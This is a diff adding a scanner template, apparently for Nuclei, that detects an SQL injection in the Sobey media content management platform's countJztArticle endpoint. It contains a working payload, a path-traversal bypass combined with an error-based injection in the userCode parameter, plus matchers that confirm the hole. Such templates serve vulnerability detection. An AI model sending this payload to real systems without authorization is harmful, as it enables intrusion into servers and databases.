@@ -1,0 +1,35 @@
+id: sobey-imcmp-countjztarticle-sqli
+info:
+  name: Sobey Integrated Media Content Management Platform countJztArticle SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Sobey"
+          - ".countJztArticle"
+          - "java.sql.SQLException"
+          - "~{{t2}}~"
+        condition: and
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "~([a-f0-9]{32})~"
